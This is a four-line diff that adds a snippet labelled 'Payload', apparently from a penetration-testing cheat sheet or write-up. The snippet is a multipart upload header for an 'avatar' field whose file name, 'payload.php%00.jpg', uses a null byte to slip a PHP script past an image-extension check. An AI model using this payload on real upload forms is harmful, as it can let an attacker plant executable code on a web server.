@@ -1,0 +1,4 @@
+Payload
+```http
+Content-Disposition: form-data; name="avatar"; filename="payload.php%00.jpg"
+```
